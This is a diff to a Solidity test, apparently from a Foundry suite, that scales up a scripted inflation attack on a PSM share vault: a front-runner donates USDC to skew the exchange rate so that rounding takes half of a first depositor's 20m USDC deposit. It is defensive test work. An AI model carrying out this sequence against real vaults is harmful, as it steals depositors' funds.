@@ -22,25 +22,25 @@ contract InflationAttackTests is PSMTestBase {
 
         assertEq(psm.shares(frontRunner), 1);
 
-        // Step 2: Front runner transfers 1m USDC to inflate the exchange rate to 1:(1m + 1)
+        // Step 2: Front runner transfers 10m USDC to inflate the exchange rate to 1:(10m + 1)
 
-        deal(address(usdc), frontRunner, 1_000_000e6);
+        deal(address(usdc), frontRunner, 10_000_000e6);
 
         vm.prank(frontRunner);
-        usdc.transfer(address(psm), 1_000_000e6);
+        usdc.transfer(address(psm), 10_000_000e6);
 
         // Highly inflated exchange rate
-        assertEq(psm.convertToAssetValue(1), 1_000_000e18 + 1);
+        assertEq(psm.convertToAssetValue(1), 10_000_000e18 + 1);
 
-        // Step 3: First depositor deposits 2 million USDC, only gets one share because rounding
-        //         error gives them 1 instead of 2 shares, worth 1.5m USDC
+        // Step 3: First depositor deposits 20 million USDC, only gets one share because rounding
+        //         error gives them 1 instead of 2 shares, worth 15m USDC
 
-        _deposit(firstDepositor, address(usdc), 2_000_000e6);
+        _deposit(firstDepositor, address(usdc), 20_000_000e6);
 
         assertEq(psm.shares(firstDepositor), 1);
 
         // 1 share = 3 million USDC / 2 shares = 1.5 million USDC
-        assertEq(psm.convertToAssetValue(1), 1_500_000e18);
+        assertEq(psm.convertToAssetValue(1), 15_000_000e18);
 
         // Step 4: Both users withdraw the max amount of funds they can
 
@@ -49,8 +49,8 @@ contract InflationAttackTests is PSMTestBase {
 
         assertEq(usdc.balanceOf(address(psm)), 0);
 
-        // Front runner profits 500k USDC, first depositor loses 500k USDC
-        assertEq(usdc.balanceOf(firstDepositor), 1_500_000e6);
-        assertEq(usdc.balanceOf(frontRunner),    1_500_000e6);
+        // Front runner profits 5m USDC, first depositor loses 5m USDC
+        assertEq(usdc.balanceOf(firstDepositor), 15_000_000e6);
+        assertEq(usdc.balanceOf(frontRunner),    15_000_000e6);
     }
 }
